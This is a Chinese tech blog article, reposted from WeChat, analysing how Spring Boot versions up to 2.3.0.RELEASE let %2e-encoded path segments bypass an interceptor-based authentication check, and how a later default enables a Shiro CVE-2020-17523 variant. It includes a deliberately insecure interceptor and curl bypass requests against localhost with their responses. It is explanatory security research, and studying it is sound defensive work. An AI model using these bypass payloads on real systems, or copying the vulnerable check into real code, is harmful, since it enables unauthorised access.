> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzA3MTUzOTcxOQ==&mid=2452982867&idx=2&sn=58c03f85463e4c6cf0061ed902b76ddb&chksm=88ed213bbf9aa82d25118878dfb6a264043317073510697318166020a996eb3f0c21b26a0eff&mpshare=1&scene=1&srcid=0602cC8DPUGedFFHi32fmRbQ&sharer_sharetime=1622629844810&sharer_shareid=612f5b49e3a144665772976c7ebceb16#rd)

**大家好，我是磊哥。**

[分享一个 Spring Boot 中关于 %2e 的小 Trick。先说结论，当 Spring Boot 版本在小于等于 2.3.0.RELEASE 的情况下， `alwaysUseFullPath` 为默认值 false，这会使得其获取 ServletPath，所以在路由匹配时相当于会进行路径标准化包括对 `%2e` 解码以及处理跨目录，这可能导致身份验证绕过。而反过来由于高版本将 `alwaysUseFullPath` 自动配](https://mp.weixin.qq.com/s?__biz=MzA3MTUzOTcxOQ==&mid=2452981393&idx=2&sn=9c0005ed9e5119eef7183eb25db0edee&scene=21#wechat_redirect)置成了 true 从而开启全路径，又可能导致一些安全问题。这里我们来通过一个例子看一下这个 Trick，并分析它的原因。首先我们先来设置 Sprin Boot 版本

**注 意**  

```
<parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>2.3.0.RELEASE</version>
    <relativePath/>  <!--  lookup parent  from repository  -->
</parent>


```

编写一个 Controller

```
@RestController
public class httpbinController {
    @RequestMapping(value = "no-auth", method = RequestMethod.GET)
    public String noAuth() {
        return "no-auth";
    }

    @RequestMapping(value = "auth", method = RequestMethod.GET)
    public String auth() {
        return "auth";
    }
}


```

接下来配置对应的 Interceptor 来实现对除 no-auth 以外的路由的拦截

```
@Configuration
public class WebMvcConfig implements WebMvcConfigurer {
    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(handlerInterceptor())
                //配置拦截规则
                .addPathPatterns("/**");
    }
 
    @Bean
    public HandlerInterceptor handlerInterceptor() {
        return new PermissionInterceptor();
    }
}
 
@Component
public class PermissionInterceptor implements HandlerInterceptor {
    @Override
    public boolean preHandle(HttpServletRequest request,
                             HttpServletResponse response,
                             Object handler) throws Exception {
        String uri = request.getRequestURI();
        uri = uri.replaceAll("//", "/");
        System.out.println("RequestURI: "+uri);
        if (uri.contains("..") || uri.contains("./") ) {
            return false;
        }
        if (uri.startsWith("/no-auth")){
            return true;
        }
        return false;
    }
}


```

[由上面代码可以知道它使用了 getRequestURI 来进行路由判断。通常你可以看到如 `startsWith` ， `contains` 这样的判断方式，显然这是不安全的，我们绕过方式由很多比如 `..` 或 `..;` 等，但其实在用 `startsWith` 来判断白名单时构造都离不开跨目录的符号 `..` 那么像上述代码这种情况又如何来绕过呢? 答案就是 `%2e` 发起请求如下](https://mp.weixin.qq.com/s?__biz=MzA3MTUzOTcxOQ==&mid=2452981393&idx=2&sn=9c0005ed9e5119eef7183eb25db0edee&scene=21#wechat_redirect)

```
$ curl -v "http://127.0.0.1:8080/no-auth/%2e%2e/auth"
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET /no-auth/%2e%2e/auth HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.64.1
> Accept: */*
>
< HTTP/1.1 200
< Content-Type: text/plain;charset=UTF-8
< Content-Length: 4
< Date: Wed, 14 Apr 2021 13:22:03 GMT
<
* Connection #0 to host 127.0.0.1 left intact
auth
* Closing connection 0


```

RequestURI 输出为

```
RequestURI:  /no-auth/%2e%2e/auth


```

[可以看到我们通过 `%2e%2e` 绕过了 PermissionInterceptor 的判断，同时匹配路由成功，很显然应用在进行路由匹配时会进行路径标准化包括对 `%2e` 解码以及处理跨目录即如果存在 `/../` 则返回上一级目录。我们再来切换 Spring Boot 版本再来看下](https://mp.weixin.qq.com/s?__biz=MzA3MTUzOTcxOQ==&mid=2452981393&idx=2&sn=9c0005ed9e5119eef7183eb25db0edee&scene=21#wechat_redirect)

```
<version>2.3.1.RELEASE</version>


```

发起请求，当然也是过了拦截，但没有匹配路由成功，返回 404

```
$ curl -v "http://127.0.0.1:8080/no-auth/%2e%2e/auth"
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET /no-auth/%2e%2e/auth HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.64.1
> Accept: */*
>
< HTTP/1.1 404
< Vary: Origin
< Vary: Access-Control-Request-Method
< Vary: Access-Control-Request-Headers
< Content-Length: 0
< Date: Wed, 14 Apr 2021 13:17:26 GMT
<
* Connection #0 to host 127.0.0.1 left intact
* Closing connection 0


```

RequestURI 输出为

```
RequestURI: /no-auth/%2e%2e/auth


```

[可以得出结论当 Spring Boot 版本在小于等于 2.3.0.RELEASE 的情况下，其在路由匹配时会进行路径标准化包括对 `%2e` 解码以及处理跨目录，这可能导致身份验证绕过。那么又为什么会这样？在 SpringMVC 进行路由匹配时会从 DispatcherServlet 开始，然后到 HandlerMapping 中去获取 Handler，在这个时候就会进行对应 path 的匹配。我们来跟进代码看这个关键的地方 `org.springframework.web.util.UrlPathHelper#getLookupPathForRequest(javax.servlet.http.HttpServletRequest)` 这里就出现有趣的现象，在 2.3.0.RELEASE 中 `alwaysUseFullPath` 为默认值 false](https://mp.weixin.qq.com/s?__biz=MzA3MTUzOTcxOQ==&mid=2452981393&idx=2&sn=9c0005ed9e5119eef7183eb25db0edee&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_jpg/tO7NEN7wjr7f0yq7Z4S8Pd8trvicwXX5k8sdLE7pJe2C6KQOMI9NtwtTW9h2VdrqBIicJjsDcNQOfnDhKMLUyfKg/640?wx_fmt=jpeg)

68_1.png

而在 2.3.1.RELEASE 中 `alwaysUseFullPath` 被设置成了 true

![](https://mmbiz.qpic.cn/mmbiz_jpg/tO7NEN7wjr7f0yq7Z4S8Pd8trvicwXX5kibHR8tOYyHXicPIKhYlNsViatXWhxSXme8icLzrl1UxMozXlWD7vuic7g1g/640?wx_fmt=jpeg)

68_2.png

[这也就导致了不同的结果，一个走向了 `getPathWithinApplication` 而另一个走向了 `getPathWithinServletMapping` 在 `getPathWithinServletMapping` 中会获取 ServletPath，ServletPath 会对 uri 标准化包括先解码然后处理跨目录等，这个很多讲 Tomcat uri 差异的文章都提过了，就不多说了。另外关注：架构师专栏，在后台回复：“面试题” 可以获取，高清 PDF 最新版 3625 页互联网大厂面试题。而 `getPathWithinApplication` 中主要是先获取 RequestURI 然后解码但之后没有再次处理跨目录，所以保留了 `..` 因此无法准确匹配到路由。到这里我们可以看到这两者的不同，也解释了最终出现绕过情况的原因。那么 Trick 的具体描述就成了当 Spring Boot 版本在小于等于 2.3.0.RELEASE 的情况下， `alwaysUseFullPath` 为默认值 false，这会使得其获取 ServletPath，所以在路由匹配时相当于会进行路径标准化包括对 `%2e` 解码以及处理跨目录，这可能导致身份验证绕过。而这和 Shiro 的 CVE-2020-17523 中的一个姿势形成了呼应，只要高版本 Spring Boot 就可以了不用非要手动设置 `alwaysUseFullPath`](https://mp.weixin.qq.com/s?__biz=MzA3MTUzOTcxOQ==&mid=2452981393&idx=2&sn=9c0005ed9e5119eef7183eb25db0edee&scene=21#wechat_redirect)

```
$ curl -v http://127.0.0.1:8080/admin/%2e
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET /admin/%2e HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.64.1
> Accept: */*
>
< HTTP/1.1 200
< Content-Type: text/plain;charset=UTF-8
< Content-Length: 10
< Date: Wed, 14 Apr 2021 13:48:33 GMT
<
* Connection #0 to host 127.0.0.1 left intact
admin page* Closing connection 0
 


```

[因为混合使用 Spring Framework 依赖时用户需要明确配置而 Spring Boot 会自动配置 Spring Framework，所以在使用 Spring Boot 的时候官方提供了 shiro-spring-boot-web-starter 依赖来支持 UrlPathHelper（https://shiro.apache.org/spring-boot.html）这样可以解决这类问题，上面这种姿势也就不存在了。对于非 Spring Boot 应用你可以通过这种方式（https://shiro.apache.org/spring-framework.html#web-applications）来配置 UrlPathHelper。感兴趣的可以再看看说不定有额外收获。话说回来，可是为什么在高版本中 `alwaysUseFullPath` 会被设置成 true 呢？这就要追溯到 `org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration.WebMvcAutoConfigurationAdapter#configurePathMatch` 在 spring-boot-autoconfigure-2.3.0.RELEASE 中](https://mp.weixin.qq.com/s?__biz=MzA3MTUzOTcxOQ==&mid=2452981393&idx=2&sn=9c0005ed9e5119eef7183eb25db0edee&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_jpg/tO7NEN7wjr7f0yq7Z4S8Pd8trvicwXX5koJZlNjqlib0ksw9Wvu4mLZCutdnppRO3FSJia8ZDXaOkzfWqpxGGSXYQ/640?wx_fmt=jpeg)

在 spring-boot-autoconfigure-2.3.1.RELEASE 中

![](https://mmbiz.qpic.cn/mmbiz_jpg/tO7NEN7wjr7f0yq7Z4S8Pd8trvicwXX5kibHR8tOYyHXicPIKhYlNsViatXWhxSXme8icLzrl1UxMozXlWD7vuic7g1g/640?wx_fmt=jpeg)

为什么要这样设置？我们查看 git log 这里给出了答案。

![](https://mmbiz.qpic.cn/mmbiz_jpg/tO7NEN7wjr7f0yq7Z4S8Pd8trvicwXX5kZUM0GImHicIibG4YGdIWY11RibiadgePQ2tTzMUOfia3nxuCVmwITvj2Fmw/640?wx_fmt=jpeg)

**https://github.com/spring-projects/spring-boot/commit/a12a3054c9c5dded034ee72faac20e578b5503af**

当 Servlet 映射为”/” 时，官方认为这样配置是更有效率的，因为需要请求路径的处理较少。配置 servlet.path 可以通过如下，但通常不会这样配置除非有特殊需求。

```
spring.mvc.servlet.path=/test/


```

[所以最后，当 Spring Boot 版本在小于等于 2.3.0.RELEASE 的情况下， `alwaysUseFullPath` 为默认值 false，这会使得其获取 ServletPath，所以在路由匹配时相当于会进行路径标准化包括对 `%2e` 解码以及处理跨目录，这可能导致身份验证绕过。而高版本为了提高效率对 `alwaysUseFullPath` 自动配置成了 true 从而开启全路径，这又造就了 Shiro 的 CVE-2020-17523 中在配置不当情况下的一个利用姿势，如果代码中没有提供对此类参数的判断支持，那么就可能会存在安全隐患。其根本原因是 Spring Boot 自动配置的内容发生了变化。](https://mp.weixin.qq.com/s?__biz=MzA3MTUzOTcxOQ==&mid=2452981393&idx=2&sn=9c0005ed9e5119eef7183eb25db0edee&scene=21#wechat_redirect)

来源 | http://rui0.cn/archives/1643

**近期技术热文**

**1、**[请别再纠结，线程池大小 + 线程数量了](https://mp.weixin.qq.com/s?__biz=MzA3MTUzOTcxOQ==&mid=2452982836&idx=2&sn=709b6c998f06788e3191ba9d30cc1a7b&scene=21#wechat_redirect)  
**2、**[牛逼哄哄的 BitMap，到底牛逼在哪？](https://mp.weixin.qq.com/s?__biz=MzI4NTM1NDgwNw==&mid=2247492583&idx=2&sn=5a3e28c498ef00adbb1e1faf222ca60b&scene=21#wechat_redirect)  
**3、**[MySQL 8.0 的 5 个新特性，太实用了](https://mp.weixin.qq.com/s?__biz=MzI4NTM1NDgwNw==&mid=2247492545&idx=2&sn=a8011bbb1bc8ba850797129a5b473a94&scene=21#wechat_redirect)  
**4、**[ZK、Eureka、Consul 、Nacos，注册中心怎么选？](https://mp.weixin.qq.com/s?__biz=MzI4NTM1NDgwNw==&mid=2247492524&idx=2&sn=39f3b1b57cde354dd2ebc77846048e45&scene=21#wechat_redirect)[](https://mp.weixin.qq.com/s?__biz=MzA3MTUzOTcxOQ==&mid=2452982499&idx=1&sn=4fb00e5d5b513abb0b286f2e537219ed&scene=21#wechat_redirect)

[**阅读原文：** **高清** **7701 页大厂面试题  PDF**](https://mp.weixin.qq.com/s?__biz=MzA3MTUzOTcxOQ==&mid=2452981393&idx=2&sn=9c0005ed9e5119eef7183eb25db0edee&scene=21#wechat_redirect)